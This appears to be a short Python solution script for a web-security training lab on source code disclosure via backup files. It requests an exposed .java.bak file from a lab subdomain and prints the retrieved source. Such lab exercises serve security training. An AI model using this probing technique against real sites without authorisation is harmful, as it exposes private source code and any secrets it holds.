# Lab: Source code disclosure via backup files
# difficulty: apprentice

import requests

sub = '0a8c00d4030a3b7d820afcd400310068'
url = f'https://{sub}.web-security-academy.net'

def main():
    endpoint = '/backup/ProductTemplate.java.bak'
    r = requests.get(url + endpoint)
    print(r.text)
    
if __name__ == '__main__':
    main()